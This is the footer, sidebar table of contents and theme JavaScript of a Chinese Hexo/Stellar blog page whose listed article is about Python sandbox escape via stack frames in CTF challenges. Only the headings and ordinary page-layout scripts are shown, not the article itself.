+<p>本站由 <a href="/">@Mi4t</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请GitHub留言删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p> 
+</center>
+<center><span id="runtime_span"></span></center>
+<script type="text/javascript">
+function show_runtime() {
+    window.setTimeout("show_runtime()", 1000);
+    X = new Date("2024/06/06 21:20:00"); // 网站开始运行的日期和时间
+    Y = new Date(); // 当前日期和时间
+    T = (Y.getTime() - X.getTime()); // 网站运行的总毫秒数
+    M = 24 * 60 * 60 * 1000; // 一天的毫秒数
+    a = T / M; // 总天数
+    A = Math.floor(a); // 总天数的整数部分
+    b = (a - A) * 24; // 总小时数
+    B = Math.floor(b); // 总小时数的整数部分
+    c = (b - B) * 60; // 总分钟数
+    C = Math.floor((b - B) * 60); // 总分钟数的整数部分
+    D = Math.floor((c - C) * 60); // 总秒数
+    runtime_span.innerHTML = "⏱️勉强运行 <span class='runtime'>" + A + "天" + B + "小时" + C + "分" + D + "秒</span>"};
+show_runtime();
+</script>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://www.flyalready.cn/asset/posts/keyboard.png" alt="描述文字" style="float: right; width: 60px; margin-left: 20px;">
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://www.flyalready.cn/asset/posts/keyboard.png" alt="描述文字" style="float: left; width: 60px; margin-left: 20px;">
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E5%88%A9%E7%94%A8%E5%B8%A7%E6%A0%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">python利用帧栈沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-text">生成器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text">生成器表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E5%B1%9E%E6%80%A7"><span class="toc-text">生成器属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A7%E6%A0%88-stack-frame"><span class="toc-text">帧栈(stack frame)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B8%A7%E6%A0%88%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">利用帧栈沙箱逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#globals%E4%B8%AD%E7%9A%84-builtins%E5%AD%97%E6%AE%B5"><span class="toc-text">globals中的__builtins字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#L3HCTF2024"><span class="toc-text">L3HCTF2024</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B"><span class="toc-text">第九届中国海洋大学信息安全竞赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9wp"><span class="toc-text">官方wp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gc"><span class="toc-text">gc</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="toggle-font" onclick="toggleLXGWFont()"><svg class="theme-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><path d="m12.677 17.781l-2.626-6.256l-2.694 6.256Zm6.723 6.511h-7.069v-1.365l.458-.023a1.847 1.847 0 0 0 .972-.2a.313.313 0 0 0 .145-.263a4.158 4.158 0 0 0-.419-1.4l-.812-1.931H7.322L6.4 21.259a3.319 3.319 0 0 0-.349 1.157c0 .036 0 .119.154.241a2.481 2.481 0 0 0 1.191.247l.448.033v1.354H2v-1.31l.4-.07a2.188 2.188 0 0 0 1-.318a6.318 6.318 0 0 0 1.18-2.066l5.575-13.036H11.2l5.512 13.174a5.255 5.255 0 0 0 1.049 1.835a1.959 1.959 0 0 0 1.19.4l.454.027Zm6.441-2.732v-3.985a22.542 22.542 0 0 0-2.226.97a3.845 3.845 0 0 0-1.29 1.05a2.03 2.03 0 0 0-.388 1.2a1.951 1.951 0 0 0 .491 1.362a1.49 1.49 0 0 0 1.13.544a4.142 4.142 0 0 0 2.283-1.141m-3.333 2.949a2.833 2.833 0 0 1-2.139-.893a3.206 3.206 0 0 1-.833-2.285a2.959 2.959 0 0 1 .415-1.577a5 5 0 0 1 1.791-1.625a23.876 23.876 0 0 1 3.617-1.588v-.074a2.905 2.905 0 0 0-.383-1.833a1.325 1.325 0 0 0-1.075-.412a1.155 1.155 0 0 0-.816.26a.687.687 0 0 0-.277.536l.023.646a1.62 1.62 0 0 1-.4 1.158a1.481 1.481 0 0 1-2.1-.019a1.634 1.634 0 0 1-.391-1.134a2.8 2.8 0 0 1 1.182-2.177a4.813 4.813 0 0 1 3.125-.932a5.381 5.381 0 0 1 2.508.524a2.628 2.628 0 0 1 1.213 1.346a6.391 6.391 0 0 1 .244 2.2v3.55a14.665 14.665 0 0 0 .051 1.749a.661.661 0 0 0 .054.2c.085-.078.284-.225.864-.806l.819-.828v1.967l-.1.128c-.958 1.283-1.883 1.907-2.83 1.907a1.6 1.6 0 0 1-1.257-.557a1.788 1.788 0 0 1-.358-.74a9.688 9.688 0 0 1-1.433.977a3.579 3.579 0 0 1-1.514.332"/></svg><span>更改字体</span></a><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.28.1" async></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script defer src="/js/changefont.js"></script>
+</div></body></html>
